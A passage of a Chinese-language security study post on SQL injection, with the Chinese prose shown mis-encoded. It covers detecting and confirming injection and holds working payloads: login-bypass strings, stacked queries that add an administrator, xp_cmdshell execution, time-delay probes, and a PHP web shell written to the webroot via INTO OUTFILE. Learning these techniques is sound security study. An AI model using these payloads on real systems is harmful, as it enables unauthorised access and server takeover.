punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span>receiveErrorResponse<span class="token punctuation">(</span>Query ExecutorImpl<span class="token punctuation">.</span>java:<span class="token number">1512</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span>processResults<span class="token punctuation">(</span>QueryExecutorImpl<span class="token punctuation">.</span>java:<span class="token number">1297</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span><span class="token keyword">execute</span><span class="token punctuation">(</span>QueryExecutorlmpl<span class="token punctuation">.</span> java:<span class="token number">188</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span><span class="token keyword">execute</span><span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">430</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>executeWithFlags <span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">332</span><span class="token punctuation">)</span>at orgãƒ»postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>executeQuery<span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">231</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2DatabaseMetaData<span class="token punctuation">.</span>getTables <span class="token punctuation">(</span>AbstractJdbc2DatabaseMetaData<span class="token punctuation">.</span>java:<span class="token number">2190</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="åº”ç”¨ç¨‹åºçš„å“åº”"><a href="#åº”ç”¨ç¨‹åºçš„å“åº”" class="headerlink" title="åº”ç”¨ç¨‹åºçš„å“åº”"></a>åº”ç”¨ç¨‹åºçš„å“åº”</h5><h6 id="å¸¸è§é”™è¯¯"><a href="#å¸¸è§é”™è¯¯" class="headerlink" title="å¸¸è§é”™è¯¯"></a>å¸¸è§é”™è¯¯</h6><p>å½“æ³¨å…¥ä¸€ä¸ªé¡µé¢ä¸€ç›´è¿”å›ç›¸åŒçš„æŠ¥é”™é¡µé¢ï¼Œè¿™æ—¶å€™ä¸èƒ½ç›´æ¥åˆ¤æ–­ä¸ºSQLæ³¨å…¥</p><p>æ³¨å…¥ä»£ç </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> products<span class="token keyword">WHERE</span> category<span class="token operator">=</span><span class="token string">'attacker'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿”å›ä¸€ä¸ªæŠ¥é”™é¡µé¢ï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦æ˜¯sqlæ³¨å…¥äº§ç”Ÿçš„æŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> products<span class="token keyword">WHERE</span> category<span class="token operator">=</span><span class="token string">'attacker'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span>'<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>or '1'='1'</code>æ˜¯ä¸€ä¸ªæ¡ä»¶æ°¸çœŸå¼ï¼Œå¹¶ä¸”æ˜¯æœ‰æ„ä¹‰çš„ï¼Œä¸å½±å“å…¶ä»–éƒ¨åˆ†ï¼Œå¯ä»¥è¿”å›è¡¨ä¸­çš„æ‰€æœ‰è¡Œï¼Œä½†æ˜¯æ•°æ®åº“å¤§çš„æ—¶å€™ï¼Œè¿”å›æ‰€æœ‰è¡Œä¼šå¾ˆä¹…ï¼Œè¿™æ˜¯å¯ä»¥æ³¨å…¥</p><p><code>or '1'='2'</code>åªè¦ä¸å½±å“sqlè¯­å¥å°±è¡Œ</p><p>å¦‚æœä¸è¿”å›æŠ¥é”™é¡µé¢äº†ï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯sqlæ³¨å…¥å¼•èµ·çš„æŠ¥é”™äº†</p><p>ä¹Ÿå¯ä»¥ç”¨æ°¸å‡å¼<code>and '1'='1'</code>ï¼Œå¦‚æœä¸è¿”å›ä¿¡æ¯ï¼Œåˆ™æ˜¯sqlæ³¨å…¥ï¼Œå’Œæ°¸çœŸç›¸å</p><p>å½“ç„¶ï¼Œæ°¸å‡å¼ä¹Ÿå¯èƒ½è¿”å›ä¿¡æ¯ï¼Œå¯èƒ½æ˜¯<code>union</code>è”åˆæŸ¥è¯¢</p><h6 id="HTTPä»£ç é”™è¯¯"><a href="#HTTPä»£ç é”™è¯¯" class="headerlink" title="HTTPä»£ç é”™è¯¯"></a>HTTPä»£ç é”™è¯¯</h6><p>webæœåŠ¡å™¨è¯·æ±‚webæºæ—¶å‘ç”Ÿé”™è¯¯ï¼Œä¼šè¿”å›500çŠ¶æ€ç </p><p>è¿˜ä¸€ç§æ˜¯äº§ç”Ÿé”™è¯¯å302é‡å®šå‘åˆ°å…¶ä»–é¡µé¢</p><h6 id="ä¸åŒå¤§å°çš„å“åº”"><a href="#ä¸åŒå¤§å°çš„å“åº”" class="headerlink" title="ä¸åŒå¤§å°çš„å“åº”"></a>ä¸åŒå¤§å°çš„å“åº”</h6><p>æ¯æ¬¡è¿”å›çš„å“åº”éƒ½æœ‰æ‰€ä¸åŒï¼Œæ¯”è¾ƒè¿™äº›ç»†å¾®çš„ä¸åŒï¼Œå¯èƒ½æ‰¾åˆ°ä¸€äº›æ³¨å…¥çº¿ç´¢</p><p>æ¯”å¦‚è¿”å›çš„å†…å®¹ï¼ŒçŠ¶æ€ç â€¦â€¦</p><h5 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h5><p>ä¸€ä¸ªé¡µé¢ä¼šå› ä¸ºä¸åŒçš„æ“ä½œäº§ç”Ÿä¸åŒçš„çŠ¶æ€ï¼Œç”¨ä¸åŒçš„çŠ¶æ€æ¥è¡¨ç¤ºæ³¨å…¥çš„ç»“æœï¼Œè‡ªåŠ¨åŒ–æ³¨å…¥ä¸åŒçš„å†…å®¹ï¼Œå¹¶æ ¹æ®å“åº”çŠ¶æ€åˆ¤æ–­æ³¨å…¥ç»“æœï¼Œè¿™å°±æ˜¯SQLç›²æ³¨ï¼Œå½“ç„¶ï¼Œè¦å…ˆæ‰¾åˆ°æ³¨å…¥ç‚¹</p><p>ä¾‹å­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=1</span><span class="token comment">--è¿”å›ç¬¬ä¸€ä»¶å•†å“</span>http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</span>â€•è¿”å›ç¬¬äºŒä»¶å•†å“<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>id=2æ—¶æ˜¯æ­£å¸¸æŸ¥è¯¢ï¼Œ åŠ ä¸Š<code>or 1=1</code>åä¼šæŸ¥è¯¢æ‰€æœ‰åˆ—ï¼Œæ•°æ®åº“æ£€æµ‹è¯¥è¯­å¥ä¸ºå¼‚å¸¸ï¼Œä¼šè¿”å›id=1çš„é¡µé¢ï¼Œè€Œ<code>or 1=2</code>ç›¸å½“id=2 ä¸å½±å“sqlè¯­å¥ï¼Œä¼šè¿›å…¥id=2çš„é¡µé¢</p><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡è¿”å›é¡µé¢åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸ <code>or +payload</code></p><h3 id="ç¡®è®¤SQLæ³¨å…¥"><a href="#ç¡®è®¤SQLæ³¨å…¥" class="headerlink" title="ç¡®è®¤SQLæ³¨å…¥"></a>ç¡®è®¤SQLæ³¨å…¥</h3><h4 id="åŒºåˆ«æ•°å­—å’Œå­—ç¬¦ä¸²"><a href="#åŒºåˆ«æ•°å­—å’Œå­—ç¬¦ä¸²" class="headerlink" title="åŒºåˆ«æ•°å­—å’Œå­—ç¬¦ä¸²"></a>åŒºåˆ«æ•°å­—å’Œå­—ç¬¦ä¸²</h4><p>æ•°å­—ä¸éœ€è¦ä½¿ç”¨å•å¼•å·æ¥è¡¨ç¤º</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span><span class="token number">3</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> <span class="token keyword">value</span> <span class="token operator">&gt;</span> <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å…¶ä»–ç±»å‹ä½¿ç”¨å•å¼•å·æ¥è¡¨ç¤º</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">'Bike'</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> published_date<span class="token operator">&gt;</span><span class="token string">'01/01/2013'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å†…è”SQLæ³¨å…¥"><a href="#å†…è”SQLæ³¨å…¥" class="headerlink" title="å†…è”SQLæ³¨å…¥"></a>å†…è”SQLæ³¨å…¥</h4><p>å†…è”æ³¨å…¥æ˜¯æŒ‡å‘æŸ¥è¯¢æ³¨å…¥ä¸€äº›SQLä»£ç åï¼ŒåŸæ¥çš„ä»£ç ä»ç„¶ä¼šå…¨éƒ¨æ‰§è¡Œ</p><h5 id="å­—ç¬¦ä¸²å†…è”æ³¨å…¥"><a href="#å­—ç¬¦ä¸²å†…è”æ³¨å…¥" class="headerlink" title="å­—ç¬¦ä¸²å†…è”æ³¨å…¥"></a>å­—ç¬¦ä¸²å†…è”æ³¨å…¥</h5><p>å®ä¾‹â€”â€”ç”¨æˆ·æäº¤ç”¨æˆ·å’Œå£ä»¤å‘é€åˆ°æ•°æ®åº“æŸ¥è¯¢å¯¹ç”¨æˆ·è¿›è¡ŒéªŒè¯</p><p><img src="https://z3.ax1x.com/2021/07/19/WJ2Jc6.png" alt="WJ2Jc6.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">æŸ¥è¯¢è¯­å¥<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å•å¼•å·æŠ¥é”™å’Œå‰é¢ä¸€æ ·</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå¯ä»¥ç›´æ¥<code>' or 1=1 #</code>ç»•è¿‡éªŒè¯ç™»å½•ï¼Œä½†æ˜¯è¦ä¸æ”¹å˜sqlè¯­å¥çš„ç»“æ„ï¼Œå°±ä¸èƒ½æ³¨é‡Šåé¢çš„è¯­å¥</p><p>è¿™æ—¶<code>'or '1'='1</code>ä¸ä¼šå¾—åˆ°æƒ³è¦ç»“æœï¼Œå› ä¸ºandã€orçš„ä¼˜å…ˆçº§ï¼Œandä¼˜å…ˆ</p><p><code>username='' or '1'='1 and password=''</code>æŒ‰ç…§</p><p><code>username='' or ('1'='1' and password='')</code>æ‰§è¡Œ</p><p>æ‰€ä»¥æ”¹å˜payload<code>' or 1=1 or '1'='1</code> </p><p>å½“åªå…è®¸è¿”å›ä¸€è¡Œæ—¶ï¼ŒæŒ‡å®šè¿”å›admin <code>'admin' and 1=1 or '1'='1</code></p><p>åœ¨passwdå­—æ®µæ³¨å…¥ï¼Œ<code>'or '1'='1</code>è¿”å›æ‰€æœ‰è¡Œ</p><p><img src="https://z3.ax1x.com/2021/07/19/WJ2wAH.png" alt="WJ2wAH.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users<span class="token keyword">SET</span> password <span class="token operator">=</span> <span class="token string">'new_password'</span><span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'Bob'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'old_password'</span> <span class="token operator">OR</span> <span class="token string">'1'</span><span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>' OR '1'= '1</code>æ˜¯æ³¨å…¥ä»£ç </p><p>åŠŸèƒ½æ˜¯å°†æ‰€æœ‰ç”¨æˆ·å¯†ç æ›´æ–°</p><h5 id="æ•°å­—å€¼å†…è”æ³¨å…¥"><a href="#æ•°å­—å€¼å†…è”æ³¨å…¥" class="headerlink" title="æ•°å­—å€¼å†…è”æ³¨å…¥"></a>æ•°å­—å€¼å†…è”æ³¨å…¥</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> messages<span class="token keyword">WHERE</span> uid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">USER</span> ENTRY<span class="token punctuation">]</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> received<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å°‘äº†å¼•å·çš„é—­åˆï¼Œæ›´ç®€å•äº†ï¼Œç›´æ¥æ„é€ æ°¸çœŸè¿”å›å…¨éƒ¨<code>num or 1=1</code></p><p><img src="https://z3.ax1x.com/2021/07/19/WJ26jf.png" alt="WJ26jf.png"></p><p><img src="https://z3.ax1x.com/2021/07/19/WJ2RHg.png" alt="WJ2RHg.png"></p><h4 id="ç»ˆæ­¢å¼SQLæ³¨å…¥"><a href="#ç»ˆæ­¢å¼SQLæ³¨å…¥" class="headerlink" title="ç»ˆæ­¢å¼SQLæ³¨å…¥"></a>ç»ˆæ­¢å¼SQLæ³¨å…¥</h4><p>æ”»å‡»è€…åœ¨SQLæ³¨å…¥ä»£ç æ—¶ï¼Œé€šè¿‡æ³¨é‡Šæ‰å‰©ä½™éƒ¨åˆ†æŸ¥è¯¢è¯­å¥ï¼Œä»è€Œç»“æŸåŸæ¥çš„æŸ¥è¯¢è¯­å¥</p><h5 id="æ•°æ®åº“æ³¨é‡Šè¯­æ³•"><a href="#æ•°æ®åº“æ³¨é‡Šè¯­æ³•" class="headerlink" title="æ•°æ®åº“æ³¨é‡Šè¯­æ³•"></a>æ•°æ®åº“æ³¨é‡Šè¯­æ³•</h5><p><img src="https://z3.ax1x.com/2021/07/19/WJ2LbF.png" alt="WJ2LbF.png"></p><p><code>/* */</code>å¯ä»¥ç”¨æ¥ç»•è¿‡è¿‡æ»¤ç©ºæ ¼</p><p><code>1 or 1=1 </code>è¿‡æ»¤ç©ºæ ¼å˜æˆ<code>1or1=1</code></p><p><code>/* */</code>ç»•è¿‡ <code>1/**/or/**/1=1</code></p><p>è¿˜èƒ½ç”¨æ¥æ£€æµ‹SQLæ³¨å…¥å¯¹æ³¨é‡Šçš„å¤„ç†<code>id=1/*test*/</code>ï¼Œæ²¡æœ‰å½±å“è¯å¯èƒ½å­˜åœ¨æ³¨å…¥</p><h5 id="ä½¿ç”¨æ³¨é‡Š"><a href="#ä½¿ç”¨æ³¨é‡Š" class="headerlink" title="ä½¿ç”¨æ³¨é‡Š"></a>ä½¿ç”¨æ³¨é‡Š</h5><p>ä½¿ç”¨å‰é¢ç›¸åŒçš„ç”¨æˆ·ç™»å½•éªŒè¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">æŸ¥è¯¢è¯­å¥<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>' or 1=1 -- </code> or  <code>' or 1=1 #</code>è¿”å›æ‰€æœ‰è¡Œ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">-- ' and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>admin';#</code>  å†’å……adminç™»å½•</p><p><code>username=admin';/*'</code> <code>passwd=*/'</code>è¿™ç§ç”¨äºå­˜åœ¨å¤šä¸ªæ”»å‡»å‚æ•°</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">' AND passwd = '</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨é‡Šåå‰©ä¸€å¯¹å•å¼•å·ï¼Œè¿æ¥å½¢æˆç©ºå­—ç¬¦ä¸²ï¼Œå¯¹æŸ¥è¯¢æ— å½±å“</p><p><img src="https://z3.ax1x.com/2021/07/19/WJRS81.png" alt="WJRS81.png"></p><p>å¯ä»¥ç”¨æ¥åˆ¤æ–­æ•°æ®åº“ç±»å‹</p><p><img src="https://z3.ax1x.com/2021/07/19/WJR9v6.png" alt="WJR9v6.png"></p><h5 id="æ‰§è¡Œå¤šæ¡è¯­å¥"><a href="#æ‰§è¡Œå¤šæ¡è¯­å¥" class="headerlink" title="æ‰§è¡Œå¤šæ¡è¯­å¥"></a>æ‰§è¡Œå¤šæ¡è¯­å¥</h5><p>è¿˜æœ‰å¦ä¸€ä¸ªåå­—ï¼Œå †å æ³¨å…¥ï¼Œç»ˆæ­¢äº†ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥åˆ›å»ºä¸€æ¡å…¨æ–°çš„æ²¡æœ‰é™åˆ¶çš„è¯­å¥ï¼Œç®€å•è¯´å°±æ˜¯å°†åŸå§‹è¯­å¥ç»“æŸï¼Œåœ¨åé¢åŠ å‡ æ¡æ–°è¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a <span class="token keyword">from</span> q<span class="token punctuation">;</span><span class="token keyword">select</span> b <span class="token keyword">from</span> w<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mssql 6.0åå…è®¸åœ¨åŒä¸€è¿æ¥å¥æŸ„ä¸Šæ‰§è¡ŒåŒ…å«å¤šæ¡è¯­å¥çš„å­—ç¬¦ä¸²ï¼ŒMysql 4.1åä¹Ÿå¼•å…¥è¯¥åŠŸèƒ½ï¼Œé»˜è®¤ä¸å¼€å¯ï¼ŒOracleä¸æ”¯æŒï¼Œé™¤éä½¿ç”¨PL/SQL</p><p>è¿ç”¨å‰é¢having 1=1å’Œgroup up æŠ€æœ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">â€¦â€¦id<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜æœ‰å…¶ä»–å¯åˆ©ç”¨æŠ€æœ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> administrators <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token string">'mysecretpassword'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">;</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'ping www.google.com'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/var/www/victim.com/shell.php'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/07/19/WJRiDO.png" alt="WJRiDO.png"></p><h4 id="æ—¶é—´å»¶è¿Ÿ"><a href="#æ—¶é—´å»¶è¿Ÿ" class="headerlink" title="æ—¶é—´å»¶è¿Ÿ"></a>æ—¶é—´å»¶è¿Ÿ</h4><p>æ²¡æœ‰å›æ˜¾å’ŒæŠ¥é”™ä¿¡æ¯è¢«éšè—çš„æ—¶å€™ï¼Œå¯ä»¥å‘æ•°æ®åº“æ³¨å…¥æ—¶é—´å»¶è¿Ÿï¼Œæ•°æ®åº“è¿”å›çš„æ—¶é—´åæ˜ åœ¨webé¡µé¢ï¼Œç”¨æ¥ç¡®å®šæ˜¯å¦æœ‰SQLæ³¨å…¥</p><p>mssqlå†…ç½®çš„è®¾ç½®å»¶è¿Ÿçš„å‘½ä»¤<code>waitfor delay 'hours:minutes:seconds'</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªpayloadæ„ä¹‰å°±æ˜¯è®©æ•°æ®åº“å»¶è¿Ÿ5ç§’è¿”å›æ•°æ®</p><p>mysqlç§æ²¡æœ‰æ—¶é—´å»¶è¿Ÿçš„å‡½æ•°ï¼Œå®ƒä½¿ç”¨ä¸€äº›æ‰§è¡Œæ—¶é—´å¾ˆé•¿çš„å‡½æ•°ï¼Œæ¥å¼•å…¥å»¶è¿Ÿã€‚æ¯”å¦‚<code>benchmark</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">benchmark<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span>encode<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string">'tets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†åé¢çš„å‘½ä»¤æ‰§è¡Œ10000æ¬¡ï¼Œè¿™æ ·æ—¶é—´å°±é•¿äº†ï¼Œä¸ºäº†æ›´æ˜æ˜¾ï¼Œå¯ä»¥å¢å¤§æ¬¡æ•°</p><p>oracle PL/SQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span>DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#ä¼‘çœ äº”ç§’</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é™åˆ¶ï¼šä¸èƒ½ç›´æ¥å­æŸ¥è¯¢ï¼Œç®¡ç†å‘˜æ‰èƒ½ä½¿ç”¨DBMS_LOCKåŒ…</p><p>å¦ä¸€ä¸ªæ–¹æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">32</span> <span class="token operator">or</span> l<span class="token operator">=</span>dbms_pipe<span class="token punctuation">.</span>receive_ message<span class="token punctuation">(</span><span class="token string">'RDS'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>DBMS_PIPE.RECEIVE_MESSAGEå‡½æ•°å°†ä¸ºä»RDSç®¡é“è¿”å›çš„æ•°æ®ç­‰å¾…10ç§’</p><p>PostgreSQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è‡ªåŠ¨å¯»æ‰¾SQLæ³¨å…¥"><a href="#è‡ªåŠ¨å¯»æ‰¾SQLæ³¨å…¥" class="headerlink" title="è‡ªåŠ¨å¯»æ‰¾SQLæ³¨å…¥"></a>è‡ªåŠ¨å¯»æ‰¾SQLæ³¨å…¥</h3><ul><li>è¯†åˆ«æ•°æ®è¾“å…¥</li><li>æ³¨å…¥æ•°æ®</li><li>æ£€æµ‹å“åº”ä¸­çš„å¼‚å¸¸</li></ul><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><h5 id="HP-WebInspect"><a href="#HP-WebInspect" class="headerlink" title="HP WebInspect"></a>HP WebInspect</h5><h5 id="IBM-Rational-AppScan"><a href="#IBM-Rational-AppScan" class="headerlink" title="IBM Rational AppScan"></a>IBM Rational AppScan</h5><h5 id="HP-Scrawlr"><a href="#HP-Scrawlr" class="headerlink" title="HP Scrawlr"></a>HP Scrawlr</h5><h5 id="SQLiX"><a href="#SQLiX" class="headerlink" title="SQLiX"></a>SQLiX</h5><h5 id="Paros-Proxy-Zed-Attack-Proxy"><a href="#Paros-Proxy-Zed-Attack-Proxy" class="headerlink" title="Paros Proxy/Zed Attack Proxy"></a>Paros Proxy/Zed Attack Proxy</h5><h2 id="å¤æŸ¥ä»£ç ä¸­çš„SQLæ³¨å…¥"><a href="#å¤æŸ¥ä»£ç ä¸­çš„SQLæ³¨å…¥" class="headerlink" title="å¤æŸ¥ä»£ç ä¸­çš„SQLæ³¨å…¥"></a>å¤æŸ¥ä»£ç ä¸­çš„SQLæ³¨å…¥</h2><p>åœ¨ä»£ç ä¸­æ‰¾bugï¼Œæœ‰ä»£ç å®¡è®¡çš„å‘³é“ï¼Œå®¡è®¡çš„æ˜¯sqlä»£ç </p><h3 id="å¤æŸ¥æºä»£ç ä¸­çš„SQLæ³¨å…¥"><a href="#å¤æŸ¥æºä»£ç ä¸­çš„SQLæ³¨å…¥" class="headerlink" title="å¤æŸ¥æºä»£ç ä¸­çš„SQLæ³¨å…¥"></a>å¤æŸ¥æºä»£ç ä¸­çš„SQLæ³¨å…¥</h3><ul><li>é™æ€ä»£ç åˆ†æï¼šåˆ†ææºä»£ç ï¼Œä½†ä¸æ‰§è¡Œ</li><li>åŠ¨æ€ä»£ç åˆ†æï¼šåœ¨æ‰§è¡Œä»£ç æ˜¯åˆ†æ</li><li>æ¸—å…¥ç‚¹(å®‰å…¨æ•æ„Ÿå‡½æ•°)ï¼šæ˜“å—æ”»å‡»çš„ä½ç½®</li></ul><p>ä»æ¸—å…¥ç‚¹è¿›å…¥å®¡æŸ¥ï¼Œæ‰¾åˆ°æ³¨å…¥å‚æ•°çš„ä½ç½®ï¼Œåˆ†æå‡½æ•°</p><h4 id="å±é™©çš„ç¼–ç è¡Œä¸º"><a href="#å±é™©çš„ç¼–ç è¡Œä¸º" class="headerlink" title="å±é™©çš„ç¼–ç è¡Œä¸º"></a>å±é™©çš„ç¼–ç è¡Œä¸º</h4><h5 id="å°†æœªéªŒè¯çš„è¾“å…¥æ‹¼æ¥æˆSQLè¯­å¥å¹¶æ‰§è¡Œ"><a 